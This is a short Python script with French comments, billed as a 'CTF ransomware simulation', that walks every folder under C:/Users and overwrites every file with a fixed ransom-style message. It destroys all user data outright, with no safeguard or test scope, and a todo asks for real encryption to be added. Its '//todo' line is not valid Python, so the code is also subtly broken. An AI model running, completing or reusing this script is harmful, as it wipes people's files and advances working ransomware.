#script by : Fantasmas da Reye
import os

# Dossier cible  
target_dir = "C:/Users"

# Payload: juste un texte fixe pour remplacer le contenu des fichiers
payload = "File encrypted by CTF ransomware simulation."

def pseudo_encrypt(file_path):
    with open(file_path, 'w') as file:
        file.write(payload)

for root, dirs, files in os.walk(target_dir):
    for file_name in files:
        file_path = os.path.join(root, file_name)
        pseudo_encrypt(file_path)

//todo Faire le chiffrement complet.
print("Simulation de chiffrement terminée.")
